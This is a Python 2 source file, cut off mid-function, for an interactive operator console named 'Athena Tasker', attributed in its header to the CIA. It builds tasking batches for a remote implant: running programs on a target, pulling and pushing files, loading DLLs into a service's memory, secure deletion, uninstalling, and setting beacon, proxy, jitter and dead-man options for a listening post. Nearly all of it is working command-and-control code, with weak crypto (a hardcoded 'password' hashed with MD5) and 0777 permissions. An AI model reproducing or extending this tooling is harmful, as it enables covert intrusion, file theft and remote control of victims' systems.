#!/usr/bin/python
# coding: utf-8

from argparse import ArgumentParser
from xml.etree import ElementTree

from Crypto import Random
from Crypto.Cipher import AES

import sys
import os
import shlex
import readline
import random
import zlib
import base64
import md5

class Completer:
    def __init__(self, words):
        self.words = words
        self.prefix = None
    def complete(self, prefix, index):
        if prefix != self.prefix:
            # we have a new prefix!
            # find all words that start with this prefix
            self.matching_words = [
                w for w in self.words if w.startswith(prefix)
                ]
            self.prefix = prefix
        try:
            return self.matching_words[index]
        except IndexError:
            return None

__author__ = "Center For Cyber Intelligence - Central Intelligence Agency"
__version__ = "1.0"
__description__ = "By default, the Tasker allows the Operator to interactively build tasking for an implant or implant family. Alternatively, the operator can also input tasking via a scripted tasking file."

__help_command__ = """
Athena Tasker Shell
====== ====== =====

Management Features
=============================================================
receipt  generate  list  rm  import  id  show  use  decrypt 
encrypt  help  

Command Features
=============================================================
execute  get  put  memload  memunload  set  delete  uninstall

Exit Commands:
=============================================================
bye  exit

Welcome to the Tasker shell. Type help or ? to list commands.
"""

__help__ = """
Management Features
===================
	
  Receipt - This command updates the target reference by loading the receipt.xml file defined for the target.

  Generate - This command will generate an encrypted batch file ready for deployment on the Listening Post. This command has additional options.
 
  List - This command will list the batch id and all commands defined for this batch. They are numbered from zero and can be referenced by this index.

  RM - This command will remove a command from the current batch. Each command is reference by a zero based index.  These indexes can be viewed by using the LIST command as shown above.  The remove command will remove a single command from a batch.

  Import - This command will import commands from generated script.  Script files are text files with a .txt extension.  This command incorporates external scripts into the current script. The output will display the command that were imported.  Use the LIST command to view the complete list.

  ID - The ID command is used to force a specific batch ID for the Tasker to generate. This command is generally used for debug purposes only.

  Show - This command show parent_id and child_id.

  Use - This command set parent_id and child_id.

  Encrypt - This command will encrypt and compress file.

  Decrypt -  This command will decompress and decrypt file.

  <command> help / -h - The Help command displays the Tasker Shell Interface Help as shown. Each command has extensive help and can be displayed by request <command> help.

Command Features
================

  Execute - This command will import commands from generated script. Script files are text files with a .txt extension.  This command incorporates external scripts into the current script.  The output will display the commands that were imported.  Use the LIST command to view the complete list.

  Get - This command will retrieve a file from the target.

  Put - This command will send a file to the target.  The local file must be present during the generate command.  The request will also fail if the directory does not exist on the target.

  Memload - This command will load a DLL onto the target in the same address space as the target service. The nickname option can be used to reference this specific DLL for unload.

  Memunload - This command will unload a loaded module based on the nickname provided in the memload command.  WARNING: The nickname is case sensitive.
  
  Set - This command will update a specific configuration option. The following list shows all the configuration options available via this command.

  Delete - This command will securely delete a file on the target systems.

  Uninstall - This command will uninstall the target from the remote system.
"""

__receipt__ = """
Receipt
=======
  This command updates the target reference by loading the receipt.xml file defined for the target.

  Usage: receipt <receipt filename>
  Example: receipt builder_output\\test_ABCD0064\\test_ABCD0064.receipt.xml
  Output:
  [+] New Receipt Loaded:
  [+] Receipt File: builder_output\\test_ABCD0064\\test_ABCD0064.receipt.xml
  [+] Parent ID: test
  [+] Child ID: 0064
"""

__generate__ = """
Generate
========
  This command will generate an encrypted batch file ready for deployment on the Listening Post. This command has additional options:
    * Priority (number 0..255): 0-highest, 255-lowest – priority for the server to process batch
    * Persist (bool): true-do not delete, false-delete once sent – force a file to always be run
      - during a beacon cycle. This has lower priority than other batch commands 	
      - waiting for processing.
    * Stop On Error (bool): true-do not continue processing batch on command failure
      - false-continue processing all batch command irrelevant of error status
    * Output Path: location where the batch information is stored (default: .\\tasker_output)
	
  Usage: generate priority=128 persist=false stoponerror=false output=.\\tasker\\output
  Example: generate
    [generate] - output binary batch file for a specific target
      Description: prioritize this batch request on LP (0-high, 255-low)
        Default: 128
      priority (number 0..255):
      Description: persist this batch on LP - do not delete after transfer
        Default: False
      persist (bool):
      Description: Stop executing this batch on a command error
        Default: False
          stoponerror (bool):
          Description: specific path to store batch (binary file and script)
            Default: tasker_output
          output path (string):
      PATH: d:\\Development\\Athena\\console\\tasker\\tasker_output\\test
      RSA encrypting header with client public key
        BINARY: __128_test_ABCD0064_63A95A3C_cache
        SCRIPT: __128_test_ABCD0064_63A95A3C_cache.txt

        BATCH: 63A95A3C
        0: execute pre=0 post=0 filename="ipconfig" arguments="/all"
        1: uninstall pre=0
      New Batch ID=0x8E9F251C

  Output: 
  [+] New Receipt Loaded:
  [+] Receipt File: builder_output\\test_ABCD0064\\test_ABCD0064.receipt.xml
  [+] Parent ID: test
  [+] Child ID: 1234
"""

__list__ = """
List
====

  This command will list the batch id and all commands defined for this batch. They are numbered from zero and can be referenced by this index.

  Usage: list
  Example: list
  Output: 
  [+] Parent Id: test
  [+] Child Id: 1234	
  [+] 0: execute pre=0 post=0 filename="ipconfig" arguments="/all"
  [+] 1: uninstall pre=0
"""

__rm__ = """
RM
==

  This command will remove a command from the current batch.  Each command is reference by a zero based index.  These indexes can be viewed by using the LIST command as shown above.  The remove command will remove a single command from a batch.

  Usage: rm <index>
  Example: rm 1
  Output: 
  [+] Command remove: uninstall pre=0
"""

__import__ = """
Import
======

  This command will import commands from generated script.  Script files are text files with a .txt extension.  This command incorporates external scripts into the current script. The output will display the command that were imported.  Use the LIST command to view the complete list.

  Usage: import <filename>
  Example: import tasker_output\\test\\__128_test_ABCD0064_DAD72903_cache
  Output:
  [+] Parent ID: test
  [+] Child ID: 1234
  [+] New Script Loaded: tasker\\tasker_output\\test\\__128_test_ABCD0064_DAD72903_cache
  [+] Commands Import:
  [+] 0: execute pre=0 post=0 filename="ipconfig" arguments="/all"
  [+] 1: uninstall pre=0
"""

__id__ = """
ID
==

  The ID command is used to force a specific batch ID for the Tasker to generate. This command is generally used for debug purposes only.
  
  Usage: id <hex>
  Example: id 12345678
  Output:
  [+] New Batch ID=0x12345678
"""

__show__ = """
Show
====

  This command show parent_id and child_id.

  Usage: show parent_id
	 show child_id
  Output:
  [+] Show parents
  ================
  [+] Parent ID: test
  [+] Parent ID: test2
"""

__use__ = """
Use
===

  This command set parent_id or child_id.

  Usage: use parent_id=<value> child_id=<value>
	 use parent_id=<value>
	 use child_id=<value>
  Output:
  [+] Command exec: use parent_id=test child_id=1234
"""

__execute__ = """
Execute
=======
  This command will import commands from generated script. Script files are text files with a .txt extension. This command incorporates external scripts into the current script. The output will display the commands that were imported. Use the LIST command to view the complete list.

  Usage: execute pre=<value> post=<value> task=<value> filename=<executable> arguments=<string>
  Example: execute
    [execute] - execute a command on target
      Description: amount of time prior to command processing (0-default)
      pre-delay (number):
      Description: amount of time after command processing completes (0-default)
      post-delay (number):
      Description: 0=foreground(sync) 1=background(async) task (0-default)
      task (number 0-foreground, 1-background):
      Description: specific application name on target to execute
      filename (string): ipconfig
    Description: specific arguments used with this command
    arguments (string): /all
  Output:
  [+] Command add: execute pre=0 post=0 task=0 filename="ipconfig" arguments="/all"
"""

__get__ = """
Get
===
  This command will retrieve a file from the target.

  Usage: get flag=<number> filename=<string>
  Example: get
    [get] - download a file from the target
      Description: prioritize this get request
      flag (bool): (not currently used)
      Description: specific file to retrieve
      filename (string): c:\\temp\\myfile.txt
  Output: 
  [+] Command add: get flag=0 filename="c:\\temp\\myfile.txt"
"""

__put__ = """
Put
===
  This command will send a file to the target.  The local file must be present during the generate command.  The request will also fail if the directory does not exist on the target.

  Usage: put remote_filename=<filename> local_filename=<filename>
  Example: put
    [put] - upload a file to the target
      Description: remote filename on target
      remote_filename (string): c:\\temp\\myfile.txt
      Description: local filename to use
      local_filename (string): http://192.168.1.100/myfile.txt
  Output: 
  [+] Command add: put remote_filename="http://192.168.1.100/myfile.txt" local_filename="c:\\temp\\myfile.txt"
"""

__memload__ = """
Memload
=======
  This command will load a DLL onto the target in the same address space as the target service. The nickname option can be used to reference this specific DLL for unload. WARNING: The nickname is case sensitive.

  Usage: memload pre=0 post=0 nickname=<string> filename=<filename>
  Example: memload
    [memload] - load a DLL onto the target
      Description: amount of time prior to command processing (0-default)
      pre-delay (number):
      Description: amount of time after command processing completes (0-default)
      post-delay (number):
      Description: a unique name used for this module
      nickname (string):mymodule
      Description: specific DLL module to load on target
      filename (string): c:\\temp\\magic.dll
  Output: 
  [+] Command add: memload pre=0 post=0 nickname="mymodule" filename="c:\\temp\\magic.dll"
"""

__memunload__ = """
Memunload
=========
  This command will unload a loaded module based on the nickname provided in the memload command. WARNING: The nickname is case sensitive.

  Usage: memunload pre=0 nickname=<string>
  Example: 
  [memunload] - unload a DLL already loaded on target
    Description: amount of time prior to command processing (0-default)
    pre-delay (number):
    Description: specific nickname used during memload
    nickname (string):mymodule
  Output: 
  [+] Command add: memunload pre=0 nickname="mymodule"
"""

__set__ = """
Set
===
  This command will update a specific configuration option. The following list shows all the configuration options available via this command.

  interval={number} - beacon interval
  jitter={percent} - beacon jitter in percentage
  bootdelay={number} - amount of time to wait at each boot
  hibernationdelay={number} - amount of time to wait after install
  taskingdelay={number} - amount of time to wait before tasking
  domains={string} - IP or URL of listening post
  port={port} - port number of listening post
  proxyport={port} - port number of proxy
  proxyaddress={ipaddress} - port address of proxy
  useragentstring={string} - user agent string sent with command
  urlpath={string} - url path for tasking
  acceptstring={string} - accept string
  acceptlangstring={string} - accept language string
  acceptencodingstring={string} - accept encoding string
  ieproxyaddress={string} - IE proxy address string
  wpadproxyaddress={string} - WPAd proxy address string
  statefilepath={string} - state information processing path
  batchexecutiontimeout={number} - max amount of time per batch
  commandexecutiontimeout={number} - max amount of tie per command
  maxchunksize={number} - max amount of bytes to process per send
  maxcpuutilization={percent} - max cpu utilization during processing
  maxprocessingdatasize={number} - max data size
  uninstalldate={date(YYYY-MM-DDTHH:MM:SS)} - time to uninstall
  deadmandelay={number} - maximum time to wait for successful beacon
  beaconfailures={number} - maximum number of beacons before uninstall
  killfilepath={string} - location of kill file
  safety={number} - any number - this will perform a no-operation (NOOP)

  Usage: set pre=0 post=0 <command>=<value>
  Example: 
  [set] - update a specific configuration setting on target
    Description: amount of time prior to command processing (0-default)
    pre-delay (number):
    Description: amount of time after command processing completes (0-default)
    post-delay (number)
    Description: specific name of configuration
    name:interval
    Description: specific value for the configuration
    value (number):20000
  Output: 
  [+] Command add: set pre=0 post=0 interval=20000
"""

__delete__ = """
Delete
======
  This command will securely delete a file on the target systems.
  
  Usage: delete <filename>
  Example: 
  [delete] - securely delete a file on the target
    Description: filename to use
    filename (string): c:\\temp\\magic.dll
  Output: 
  [+] Command add: delete filename="c:\\temp\\magic.dll"  
"""

__uninstall__ = """
Uninstall
=========
  This command will uninstall the target from the remote system.

  Usage: uninstall
  Example: uninstall
    [uninstall] - uninstall tool from target
    Description: amount of time prior to command processing (0-default)
    pre-delay (number):
  Output: 
  [+] Command add: uninstall pre=0
"""

__encrypt__ = """
Encrypt
=======
  This command will encrypt and compress file.

  Usage: encrypt <filename>
  Example: encrypt builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.txt
  Output:
  [+] File Script Plain-Text: builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.txt
  [+] File Encrypt and Compress: builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.enc
"""

__decrypt__ = """
Decrypt
=======
  This command will decompress and decrypt file.

  Usage: decrypt <filename>
  Example: decrypt builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.enc
  Output:
  [+] File Encrypt and Compress: builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.enc
  [+] File Script Plain-Text: builder_output\\test_ABCD0064\\__128_test_ABCD0064_DAD72903_cache.txt
"""

_pathAthena = "/var/www/athena"

_parentId = None
_childId = None
_commands = []

_exec_command = ['receipt ', 'generate', 'list', 'rm', 'import', 'id', 'show', 'use parent_id=% child_id=%', 'encrypt', 'decrypt', 'help', 'execute', 'get', 'put', 'memload', 'memunload', 'set', 'delete', 'uninstall']

_set_command = ['interval', 'jitter', 'bootdelay', 'hibernationdelay', 'taskingdelay', 'domains', 'port', 'proxyport', 'proxyaddress', 'useragentstring', 'urlpath', 'acceptstring', 'acceptlangstring', 'acceptencodingstring', 'ieproxyaddress', 'wpadproxyaddress', 'statefilepath', 'batchexecutiontimeout', 'commandexecutiontimeout', 'maxchunksize', 'maxcpuutilization', 'maxprocessingdatasize', 'uninstalldate', 'deadmandelay', 'beaconfailures', 'killfilepath', 'safety']

CRED = '\033[91m'
CGREEN = '\033[92m'
CYELLOW = '\033[93m'
CBLUE = '\033[94m'
CMAGENTA = '\033[95m'
CGREY = '\033[90m'
CBLAC = '\033[90m'
CEND = '\033[0m'

_opts = []

#XML

#CLIENT KEY
_CLIENT_PUBLIC_KEY = None
_CLIENT_PRIVATE_KEY = None

#TASKING
_COMMAND_EXECUTE_TIMEOUT = None
_STATE_FILE_PATH = None
_MAX_CPU_UTILIZATION = None
_MAX_PROCESSING_DATA_SIZE = None
_MAX_CHUNK_SIZE = None
_BATCH_EXECUTION_TIMEOUT = None

#INSTALL
_RESTART_SERVICE = None
_TARGET_FILE_NAME = None
_ORIGINAL_FILE_NAME = None
_DATA_FILE_NAME = None

#UNINSTALL
_KILL_FILE_PATH = None
_DEAD_MAN_DELAY = None
_BEACON_FAILURES = None
_DATE_AND_TIME = None

#BEACON
_BOOT_DELAY = None
_DOMAINS = None
_PORT = None
_JITTER = None
_USER_AGENT_STRING = None
_ACCEPT_STRING = None
_INTERVAL = None
_TASKING_DELAY = None
_PROXY_PORT = None
_HIBERNATION_DELAY = None
_ACCEPT_LANG_STRING = None
_IE_PROXY_ADDRESS = None
_URL_PATH = None
_ACCEPT_ENCODING_STRING = None
_WPAD_PROXY_ADDRESS = None

#SERVER_KEY
_SERVER_PUBLIC_KEY = None
_SERVER_PRIVATE_KEY = None

#SOURCE
_MASK = None

#TARGET
_CHILD_ID = None
_DYN_CONFIG_TYPE = None
_PARENT_ID = None

#END XML

BLOCK_SIZE = 16

class TaskerArgParser(ArgumentParser):
	def error(self, message):
		sys.stderr.write('error: %s\n' %message)
		self.print_help()
		sys.exit(2)

def get_args():
	parser = TaskerArgParser(description=__description__)
	parser.add_argument('-r', '--receipt', dest='receipt', help='This argument defines an existing receipt filename to be used for processing.')
	parser.add_argument('-i', '--import', dest='_import', help='This argument provides the ability to import a script for processing.')
	parser.add_argument('-g', '--generate', dest='generate', help='This argument provides the output path location.')
        parser.add_argument('-p', '--priority', dest='priority', help='This argument provides ability to set the priority/ordering(0..255) NOTE: 128->default and 0->highest.')
        parser.add_argument('-x', '--persist', dest='persist', help='This argument provides ability to set the batch as a persistent batch.')
        parser.add_argument('-e', '--stoponerror', dest='stoponerror', help='This argument provides ability to stop the batch on a command execution error.')
        parser.add_argument('--id', dest='id', help='This argument provides the ability to force a specific initial task ID for a tasking session (usually just used for debugging purposes - number is decoded as hex).')
        parser.add_argument('-d', '--debug', dest='debug', help='This argument allows debugging information to be included in the output directory.')
        parser.add_argument('-v', '--version', dest='version', help='This argument show version.', action='store_true', required=False)

	return parser.parse_args()

def initTasker():
	#TODO
	#help command
	print __help_command__

	return

def receipt(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __receipt__
		return

	if not os.path.exists(arrCommand[1]):
		print "%s[-]%s File '%s' not exists!" %(CRED, CEND, arrCommand[1])
		return
	
	#with open(arrCommand[1], 'rt') as f:
	#    tree = ElementTree.parse(f)

	#for node in tree.iter():
	#    print node.tag, node.attrib, node.text

	#print arrCommand
	print "%s[+]%s New Receipt Loaded:" %(CGREEN, CEND)
	print "%s[+]%s Receipt File: %s" %(CGREEN, CEND, arrCommand[1])
	print "%s[+]%s Parent ID: %s" %(CGREEN, CEND, arrCommand[1])
	return

def generate(arrCommand):
	if len(arrCommand) > 1 and (arrCommand[1].lower() in ('-h', 'help')) :
		print __generate__
		return

	global _parentId
	global _childId
	global _commands

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return

	if not _commands:
		print "%s[-]%s Command is NULL" %(CRED, CEND)
		return

	numfile = random.randint(0,9999)
	filename = "_128_" + _parentId + "_" + str(numfile).zfill(4) + "_cache"
	
	path_file = _pathAthena + "/" + _parentId
	if _childId is not None:
		path_file += "/" + _childId + "/inbox"
		if not os.path.exists(path_file):
			os.makedirs(path_file)
	
	path_file += "/" + filename

	#Generate File Plain-Text
	file_write = open(path_file, 'w')
	file_write.truncate()
	for command in _commands:
		file_write.write(command+"\n")				
	file_write.close()

	#Encryption
	#commands = '\n'.join(_commands)
	#encode = encryption(commands, "password")
 	#file_write = open(path_file, 'w')
	#file_write.truncate()
	#file_write.write(encode)
	#file_write.close()
	
	_commands = []
	
	print "%s[+]%s New Receipt Loaded:" %(CGREEN, CEND)
	print "%s[+]%s Parent ID: %s" %(CGREEN, CEND, _parentId)
	print "%s[+]%s Child ID: %s" %(CGREEN, CEND, _childId)
	print "%s[+]%s Receipt File: %s" %(CGREEN, CEND, path_file)
	return

def _list(arrCommand):
	if len(arrCommand) > 1 and (arrCommand[1].lower() in ('-h', 'help')) :
		print __list__
		return

	global _parentId
	global _childId
	global _commands

	print "%s[+]%s Parent ID: %s" %(CGREEN, CEND, _parentId)
	print "%s[+]%s Child ID: %s" %(CGREEN, CEND, _childId)
	
	if not _commands:
		print "%s[-]%s No commands add" %(CRED, CEND)
	
	for i in range(len(_commands)):
		print("%s[+]%s %s: %s" %(CGREEN, CEND, i, _commands[i]))

	return

def rm(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __rm__
		return

	try:
		index = int(arrCommand[1])
		command = _commands[index]
		del _commands[index]
		print "%s[+]%s Removed: %s" %(CGREEN, CEND, command)
	except:
		print "%s[-]%s Index not found" %(CRED, CEND)
	return

def _import(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __import__
		return

	if not os.path.exists(arrCommand[1]):
		print "%s[-]%s File '%s' not exists!" %(CRED, CEND, arrCommand[1])
		return

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return

	global _commands
	_commands = []

	with open(arrCommand[1]) as f:
		_commands = f.read().splitlines()

	print "%s[+]%s Parent ID: %s" %(CGREEN, CEND, _parentId)
	print "%s[+]%s Child ID: %s" %(CGREEN, CEND, _childId)
	print "%s[+]%s New Script Loaded: %s" %(CGREEN, CEND, arrCommand[1])
	print "%s[+]%s Commands Import:" %(CGREEN, CEND)

	for i in range(len(_commands)):
	    print("%s[+]%s %s: %s" %(CGREEN, CEND, i, _commands[i]))

	return

def _id(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __id__
		return

	if os.path.isdir(_pathAthena + "/" + arrCommand[1]):
		print "%s[+]%s New Batch ID=%s" %(CGREEN, CEND, arrCommand[1])
		return
	else:
		print "%s[-]%s Batch %s not found" %(CRED, CEND, arrCommand[1])
		return

def show(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __show__
		return

	global _parentId

	if arrCommand[1] == "parent_id":
		print "%s[+]%s Show parents" %(CGREEN, CEND)
		print "================"
		dirs = os.walk(_pathAthena).next()[1]
		for _dir in dirs:
		    print "%s[+]%s Parent ID: %s" %(CGREEN, CEND, _dir)
	
		return
	elif _parentId is not None and arrCommand[1] == "child_id":
		print "%s[+]%s Show childs" %(CGREEN, CEND)
		print "==============="
		dirs = os.walk(_pathAthena + "/" + _parentId).next()[1]
		for _dir in dirs:
		    print "%s[+]%s Child ID: %s" %(CGREEN, CEND, _dir)
	
		return
	elif _parentId is None and arrCommand[1] == "child_id":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	else:
		print __show__
		return

def use(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')):
		print __use__
		return

	global _parentId
	global _childId
	
	try:
		for command in arrCommand:
			cmd = command.split('=')
			if cmd[0] == 'parent_id':
				_parentId = cmd[1]
			elif cmd[0] == 'child_id':
				_childId = cmd[1]
	except:
		print __use__
		return

	if _parentId in (None,""):
		_parentId = None
		_childId = None
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	elif not os.path.isdir(_pathAthena + "/" + _parentId):
		command = raw_input("%s[-]%s parent_id=%s not found! I would like to create? (S/N)" %(CRED, CEND, _parentId))

		if command.lower().strip() == "s":
			_childId = None
			os.mkdir(_pathAthena + "/" + _parentId)
			os.chmod(_pathAthena + "/" + _parentId, 0777)
			print "%s[+]%s parent_id=%s created" %(CBLUE, CEND, _parentId)			
			print "%s[+]%s parent_id=%s permission" %(CBLUE, CEND, _parentId)			
			print "%s[+]%s parent_id=%s selected" %(CBLUE, CEND, _parentId)			
		else:
			_parentId = None
			_childId = None
		return
	elif _childId is not None and not os.path.isdir(_pathAthena + "/" + _parentId + "/" + _childId):
		_childId = None
		os.chdir(_pathAthena + "/" + _parentId)
		print "%s[+]%s parent_id=%s selected" %(CGREEN, CEND, _parentId)
		print "%s[-]%s child_id=%s not found!" %(CRED, CEND, _childId)
		return
	else:
		if _parentId is not None and _childId is None:
			os.chdir(_pathAthena + "/" + _parentId)
		elif _parentId is not None and _childId is not None:
			os.chdir(_pathAthena + "/" + _parentId + "/" + _childId)
		

		print "%s[+]%s Command exec: use parent_id=%s child_id=%s" %(CGREEN, CEND, _parentId, _childId)
		return

def execute(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __execute__
		return

	#execute pre=0 post=0 task=0 filename=ipconfig arguments=/all
	global _parentId
	global _childId

	pre = 0
	post = 0
	task = 0
	filename = ""
	arguments = ""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return

	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'pre':
			pre = cmd[1]
		elif cmd[0] == 'post':
			post = cmd[1]
		elif cmd[0] == 'task':
			task = cmd[1]
		elif cmd[0] == 'filename':
			filename = cmd[1]
		elif cmd[0] == 'arguments':
			arguments = cmd[1]

	if filename is None or filename =="":
		print "%s[-]%s filename null" %(CRED, CEND)
	else:
		strComm = 'execute pre=%s post=%s task=%s filename="%s" arguments="%s"' %(pre, post, task, filename, arguments)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def get(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __get__
		return

	#get flag=0 filename="c:\temp\myfile.txt"
	global _parentId
	global _childId
	
	flag=0
	filename=""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	
	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'flag':
			flag = cmd[1]
		elif cmd[0] == 'filename':
			filename = cmd[1]

	if filename is None or filename =="":
		print "%s[-]%s Filename null" %(CRED, CEND)
	else:
		strComm = 'get flag=%s filename="%s"' %(flag, filename)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def put(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __put__
		return

	#put remote_filename="c:\windows\system32\a.txt" local_filename="c:\temp\myfile.txt"
	global _parentId
	global _childId
	
	remote_filename=""
	local_filename=""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	
	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'remote_filename':
			remote_filename = cmd[1]
		elif cmd[0] == 'local_filename':
			local_filename = cmd[1]

	if remote_filename is None or remote_filename =="":
		print "%s[-]%s remote_filename null" %(CRED, CEND)
	elif local_filename is None or local_filename =="":
		print "%s[-]%s local_filename null" %(CRED, CEND)
	else:
		strComm = 'put remote_filename="%s" local_filename="%s"' %(remote_filename, local_filename)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def memload(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __memload__
		return

	#memload pre=0 post=0 nickname="mymodule" filename="c:\temp\magic.dll"
	global _parentId
	global _childId
	
	pre=0
	post=0
	nickname=""
	filename=""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	
	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'pre':
			pre = cmd[1]
		elif cmd[0] == 'post':
			post = cmd[1]
		elif cmd[0] == 'nickname':
			nickname = cmd[1]
		elif cmd[0] == 'filename':
			filename = cmd[1]

	if nickname is None or nickname =="":
		print "%s[-]%s nickname null" %(CRED, CEND)
	elif filename is None or filename =="":
		print "%s[-]%s filename null" %(CRED, CEND)
	else:
		strComm = 'memload pre=%s post=%s nickname="%s" filename="%s"' %(pre, post, nickname, filename)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def memunload(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __memunload__
		return

	#memunload pre=0 nickname="mymodule"
	global _parentId
	global _childId
	
	pre=0
	nickname=""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	
	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'nickname':
			nickname = cmd[1]
		elif cmd[0] == 'filename':
			filename = cmd[1]

	if nickname is None or nickname =="":
		print "%s[-]%s nickname null" %(CRED, CEND)
	else:
		strComm = 'memunload pre=%s nickname="%s"' %(pre, nickname)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def _set(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __set__
		return

	#set pre=0 post=0 interval=20000
	global _parentId
	global _childId
	
	pre=0
	post=0
	_command = ""

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return
	
	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] in _set_command:
			_command += cmd[0] + "=" + cmd[1]

	if _command is None or _command =="":
		print "%s[-]%s <command> null" %(CRED, CEND)
	else:
		strComm = 'set pre=%s post=%s %s' %(pre, post, _command)
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def delete(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __delete__
		return
	
	#delete filename="c:\temp\magic.dll"
	global _parentId
	
	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return

	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'filename':
			filename = cmd[1]

	if filename is None or filename =="":
		print "%s[-]%s filename null" %(CRED, CEND)
	else:
		strComm = 'delete filename="%s"' %filename
		_commands.append(strComm)
		print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)


def uninstall(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __uninstall__
		return

	#delete filename="c:\temp\magic.dll"
	global _parentId

	pre=0

	if _parentId is None or _parentId == "":
		print "%s[-]%s parent_id not selected" %(CRED, CEND)
		return

	for command in arrCommand:
		cmd = command.split('=')
		if cmd[0] == 'pre':
			pre = cmd[1]

	strComm = 'uninstall pre=%s' %pre
	_commands.append(strComm)
	print "%s[+]%s Command add: %s" %(CGREEN, CEND, strComm)

def parentId(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __parentid__
		return

	return

def childId(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __childid__
		return

	return

def trans(key):
     return md5.new(key).digest()

def encryption(message, passphrase):
	try:
		passwd = passphrase
		passphrase = trans(passphrase)
		IV = Random.new().read(BLOCK_SIZE)
		aes = AES.new(passphrase, AES.MODE_CFB, IV)
		encode = base64.b64encode(IV + aes.encrypt(message))
	except:
		print '%s[-]%s Error encryption message' %(CRED, CEND)
		return

	#print '%s[+]%s Encryption =========================' %(CBLUE, CEND)
	#print '%s[+]%s Message: %s' %(CBLUE, CEND, message)
	#print '%s[+]%s Passphrase: %s' %(CBLUE, CEND, passwd)
	#print '%s[+]%s Passphrase Encrypted: %s' %(CBLUE, CEND, passphrase)
	#print '%s[+]%s Message Encrypted: %s' %(CBLUE, CEND, encode)

	return encode

def decryption(encrypted, passphrase):
	try:
		passwd = passphrase
		passphrase = trans(passphrase)
		encrypted = base64.b64decode(encrypted)
		IV = encrypted[:BLOCK_SIZE]
		aes = AES.new(passphrase, AES.MODE_CFB, IV)
		decode = aes.decrypt(encrypted[BLOCK_SIZE:])
	except:
		print '%s[-]%s Error decryption message' %(CRED, CEND)
		return

	#print '%s[+]%s Decryption =========================' %(CBLUE, CEND)
	#print '%s[+]%s Message Encrypted: %s' %(CBLUE, CEND, encrypted)
	#print '%s[+]%s Passphrase: %s' %(CBLUE, CEND, passwd)
	#print '%s[+]%s Passphrase Encrypted: %s' %(CBLUE, CEND, passphrase)
	#print '%s[+]%s Message Plain-Text: %s' %(CBLUE, CEND, decode)

	return decode

def encrypt(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __encrypt__
		return

	if not os.path.exists(arrCommand[1]):
		print "%s[-]%s File '%s' not exists!" %(CRED, CEND, arrCommand[1])
		return

	#Encrypt File
	file_decrypt = arrCommand[1]
	file_encrypt = os.path.splitext(arrCommand[1])[0] + '.enc'
	file_read = open(file_decrypt, 'rb').read()
	text_file = encryption(file_read, "password")

	if text_file is not None:
		file_write = open(file_encrypt, 'w')
		file_write.write(text_file)
		file_write.close()
	else:
		return

	#Compress File	
	#file_decrypt = arrCommand[1]
	#file_encrypt = os.path.splitext(arrCommand[1])[0] + '.enc'
	#file_read = open(file_decrypt, 'rb').read()
